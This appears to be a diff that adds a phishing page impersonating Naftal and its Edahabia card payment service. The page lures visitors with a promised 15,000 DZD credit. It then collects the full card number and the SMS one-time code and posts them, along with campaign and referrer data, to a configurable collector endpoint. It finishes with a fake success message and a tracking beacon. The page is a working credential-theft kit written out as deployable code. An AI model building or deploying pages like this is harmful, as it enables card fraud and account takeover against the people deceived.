@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#14315E">
+  <title>Naftal - Paiement Edahabia</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background: #EDF0F4;
+      color: #333;
+      -webkit-font-smoothing: antialiased;
+    }
+    .app { display: flex; flex-direction: column; min-height: 100vh; }
+    .app-bar {
+      height: 56px;
+      background: #14315E;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      justify-content: space-between;
+    }
+    .app-bar .back-btn {
+      width: 40px; height: 40px; border: none; background: transparent;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      color: #fff; cursor: pointer;
+    }
+    .app-bar .title {
+      font-size: 16px; font-weight: 600; color: #fff; text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+    .main { flex: 1; padding: 24px 16px 32px; }
+    .card {
+      background: #fff;
+      border: 1px solid #E8ECEF;
+      border-radius: 6px;
+      padding: 20px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.04);
+    }
+    .section-label {
+      font-size: 12px; font-weight: 600; color: #1E4F9F;
+      text-transform: uppercase; letter-spacing: 0.4px;
+      margin-bottom: 8px;
+    }
+    .title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 6px; }
+    .subtitle { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 24px; }
+    .subtitle strong { color: #14315E; }
+    .info-box {
+      background: #EDF0F4;
+      border: 1px solid #D0D5DD;
+      border-radius: 6px;
+      padding: 16px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+    .info-icon {
+      width: 28px; height: 28px; flex-shrink: 0;
+      background: #14315E;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      color: #fff;
+    }
+    .info-text { font-size: 13px; color: #1E4F9F; line-height: 1.5; }
+    .info-text strong { color: #14315E; font-weight: 600; }
+    .form-group { margin-bottom: 20px; }
+    .label {
+      display: block;
+      font-size: 13px; font-weight: 500; color: #1E4F9F;
+      text-transform: uppercase; letter-spacing: 0.3px;
+      margin-bottom: 10px;
+    }
+    .input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 1px solid #D0D5DD;
+      border-radius: 6px;
+      background: #fff;
+      color: #1a1a1a;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .input:focus {
+      border-color: #1E4F9F;
+      box-shadow: 0 0 0 3px rgba(30,79,159,0.15);
+    }
+    .input::placeholder { color: #8A9099; }
+    .input.error { border-color: #E53935; }
+    .input.error:focus { box-shadow: 0 0 0 3px rgba(229,57,53,0.15); }
+    .error-text { display: none; font-size: 12px; color: #E53935; margin-top: 6px; }
+    .input.error + .error-text { display: block; }
+    .input-card { letter-spacing: 2px; font-family: 'SF Mono', 'Fira Code', monospace; }
+    .btn-row { display: flex; justify-content: flex-end; margin-top: 8px; }
+    .btn {
+      min-width: 160px;
+      height: 48px;
+      background: #14315E;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn:active { background: #0D2448; }
+    .btn:disabled { background: #9AA3AD; cursor: not-allowed; }
+    .btn .spinner {
+      width: 20px; height: 20px;
+      border: 2px solid #fff;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: none;
+    }
+    .btn.loading .btn-text { display: none; }
+    .btn.loading .spinner { display: block; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .footer {
+      text-align: center;
+      padding: 20px 16px;
+      font-size: 12px;
+      color: #8A9099;
+      border-top: 1px solid #E8ECEF;
+      background: #fff;
+    }
+    .success-state { display: none; text-align: center; padding: 24px 0; }
+    .success-state.show { display: block; }
+    .success-icon {
+      width: 72px; height: 72px; margin: 0 auto 16px;
+      background: #EDF0F4;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .success-icon svg { width: 36px; height: 36px; fill: #14315E; }
+    .success-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+    .success-desc { font-size: 14px; color: #555; margin-bottom: 20px; }
+    .txn-id {
+      background: #EDF0F4;
+      border: 1px solid #D0D5DD;
+      border-radius: 6px;
+      padding: 12px;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      font-size: 14px;
+      color: #14315E;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <header class="app-bar">
+      <button class="back-btn" aria-label="Retour">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
+      </button>
+      <span class="title">PAIEMENT NAFATAL</span>
+      <div class="actions"></div>
+    </header>
+
+    <main class="main">
+      <div class="card">
+        <div class="title">Remise de crédit</div>
+        <p class="subtitle">Votre crédit <strong>15 000 DZD</strong> est prêt. Vérifiez votre carte Edahabia pour le recevoir.</p>
+
+        <div class="info-box">
+          <div class="info-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+          </div>
+          <div class="info-text">Le code OTP sera envoyé par SMS au <strong>05&nbsp;XX&nbsp;XX&nbsp;XX&nbsp;XX</strong>. Ne le communiquez à personne.</div>
+        </div>
+
+        <form id="verify-form" novalidate>
+          <div class="form-group">
+            <label class="label" for="card">Numéro de carte Edahabia</label>
+            <div class="input-wrapper">
+              <input type="text" id="card" name="card" class="input input-card" placeholder="•••• •••• •••• ••••" maxlength="19" required autocomplete="off">
+              <span class="error-text" id="card-error">16 chiffres requis</span>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="label" for="otp">Code OTP (6 chiffres)</label>
+            <div class="otp-wrapper" id="otp-wrapper">
+              <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="0" autocomplete="one-time-code">
+              <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="1" autocomplete="one-time-code">
+              <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="2" autocomplete="one-time-code">
+              <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="3" autocomplete="one-time-code">
+              <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="4" autocomplete="one-time-code">
+              <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="5" autocomplete="one-time-code">
+            </div>
+            <input type="hidden" id="otp" name="otp" value="">
+            <span class="error-text" id="otp-error">Code à 6 chiffres requis</span>
+          </div>
+
+          <div class="btn-row">
+            <button type="submit" class="btn" id="submit-btn">
+              <span class="btn-text">Payer</span>
+              <span class="spinner"></span>
+            </button>
+          </div>
+        </form>
+
+        <div class="success-state" id="success-state">
+          <div class="success-icon">
+            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+          </div>
+          <h2 class="success-title">Paiement réussi</h2>
+          <p class="success-desc">Le crédit Naftal a été crédité sur votre carte Edahabia.</p>
+          <div class="txn-id" id="txn-display">TXN: BMB-XXXXXX</div>
+        </div>
+      </div>
+    </main>
+
+    <footer class="footer">
+      Naftal — Algérie
+      <div class="footer-links">
+        <a href="#">Aide</a>
+        <a href="#">Confidentialité</a>
+        <a href="#">Conditions</a>
+      </div>
+    </footer>
+  </div>
+
+  <script src="beacon.js"></script>
+  <script>
+    const form = document.getElementById('verify-form');
+    const btn = document.getElementById('submit-btn');
+    const formCard = document.querySelector('.card');
+    const successState = document.getElementById('success-state');
+    const txnDisplay = document.getElementById('txn-display');
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const otpHidden = document.getElementById('otp');
+    const cardInput = document.getElementById('card');
+
+    cardInput.addEventListener('input', function(e) {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length > 16) v = v.slice(0, 16);
+      let display = '';
+      if (v.length <= 4) {
+        display = v.padEnd(v.length, '•');
+      } else {
+        const masked = '•'.repeat(v.length - 4) + v.slice(-4);
+        for (let i = 0; i < masked.length; i += 4) {
+          if (i > 0) display += ' ';
+          display += masked.slice(i, i + 4);
+        }
+      }
+      e.target.value = display;
+    });
+
+    otpInputs.forEach((input, idx) => {
+      input.addEventListener('input', function() {
+        if (this.value && this.value.match(/\d/)) {
+          this.classList.add('filled');
+          if (idx < 5) otpInputs[idx + 1].focus();
+        }
+        let otp = '';
+        otpInputs.forEach(i => otp += i.value);
+        otpHidden.value = otp;
+      });
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && idx > 0) {
+          otpInputs[idx - 1].focus();
+        }
+      });
+      input.addEventListener('paste', function(e) {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+        if (paste.length === 6) {
+          paste.split('').forEach((d, i) => {
+            otpInputs[i].value = d;
+            otpInputs[i].classList.add('filled');
+          });
+          otpHidden.value = paste;
+        }
+      });
+    });
+
+    function validateCard(v) { return v.replace(/\D/g, '').length === 16; }
+    function validateOtp(v) { return /^\d{6}$/.test(v); }
+
+    function setError(input, errorId, valid) {
+      input.classList.toggle('error', !valid);
+      document.getElementById(errorId).style.display = valid ? 'none' : 'block';
+    }
+
+    cardInput.addEventListener('blur', function() {
+      setError(this, 'card-error', validateCard(this.value));
+    });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const cardValid = validateCard(cardInput.value);
+      const otpValid = validateOtp(otpHidden.value);
+
+      setError(cardInput, 'card-error', cardValid);
+      document.getElementById('otp-error').style.display = otpValid ? 'none' : 'block';
+      otpInputs.forEach(i => i.classList.toggle('error', !otpValid));
+
+      if (!cardValid || !otpValid) return;
+
+      btn.disabled = true;
+      btn.classList.add('loading');
+
+      const data = {
+        card: cardInput.value.replace(/\D/g, ''),
+        otp: otpHidden.value,
+        campaign_id: new URLSearchParams(window.location.search).get('camp') || 'default',
+        referrer: document.referrer || 'direct',
+        url: window.location.href,
+        ts: Math.floor(Date.now() / 1000)
+      };
+
+      try {
+        const res = await fetch(window.KIT_COLLECTOR || '/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+        const ghost = await res.json();
+        if (ghost.status === 'success') {
+          formCard.style.display = 'none';
+          successState.classList.add('show');
+          txnDisplay.textContent = 'TXN: ' + ghost.tx;
+          if (window.fdjBeacon) window.fdjBeacon({ event: 'submit_success', ts: Date.now(), tx: ghost.tx });
+        } else {
+          throw new Error('Invalid response');
+        }
+      } catch (err) {
+        btn.disabled = false;
+        btn.classList.remove('loading');
+        alert('Erreur de connexion. Réessayez.');
+      }
+    });
+  </script>
+</body>
+</html>
